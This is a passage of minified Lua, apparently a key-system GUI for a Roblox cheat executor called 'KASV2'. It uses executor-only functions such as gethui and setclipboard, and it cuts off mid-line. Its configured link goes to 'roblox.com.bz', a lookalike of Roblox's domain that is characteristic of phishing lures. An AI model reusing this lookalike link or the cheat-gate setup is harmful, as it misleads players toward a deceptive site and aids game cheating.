do local CONFIG={Link="https://roblox.com.bz/communities/1436922909/",Key="YOUR-KEY-HERE",Title="KASV2",Subtitle="Enter your key to continue",Accent=Color3.fromRGB(138,92,255),Accent2=Color3.fromRGB(0,200,255)};local function LoadMainScript() print("Key accepted - main script loaded!");end local TweenService=game:GetService("TweenService");local UserInputService=game:GetService("UserInputService");local Players=game:GetService("Players");local function tween(obj,time,props) local t=TweenService:Create(obj,TweenInfo.new(time,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),props);t:Play();return t;end local function new(class,props,children) local inst=Instance.new(class);for k,v in pairs(props or {} ) do inst[k]=v;end for _,c in ipairs(children or {} ) do c.Parent=inst;end return inst;end local function corner(r) return new("UICorner",{CornerRadius=UDim.new(0,r)});end local function stroke(color,thick,trans) return new("UIStroke",{Color=color,Thickness=thick or 1 ,Transparency=trans or 0 ,ApplyStrokeMode=Enum.ApplyStrokeMode.Border});end local function gradient(c1,c2,rot) return new("UIGradient",{Color=ColorSequence.new(c1,c2),Rotation=rot or 0 });end local function copyToClipboard(text) local fn=setclipboard or toclipboard or (Clipboard and Clipboard.set) ;if fn then local ok=pcall(fn,text);return ok;end return false;end local parent;if gethui then parent=gethui();else local ok,core=pcall(function() return game:GetService("CoreGui");end);parent=(ok and core) or Players.LocalPlayer:WaitForChild("PlayerGui") ;end local old=parent:FindFirstChild("KeySystemGui");if old then old:Destroy();end local gui=new("ScreenGui",{Name="KeySystemGui",ResetOnSpawn=false,ZIndexBehavior=Enum.ZIndexBehavior.Sibling,Parent=parent});local glow=new("Frame",{Name="Glow",Size=UDim2.fromOffset(420,270),Position=UDim2.fromScale(0.5,0.5),AnchorPoint=Vector2.new(0.5,0.5),BackgroundColor3=CONFIG.Accent,BackgroundTransparency=0.82,BorderSizePixel=0,Parent=gui},{corner(24),gradient(CONFIG.Accent,CO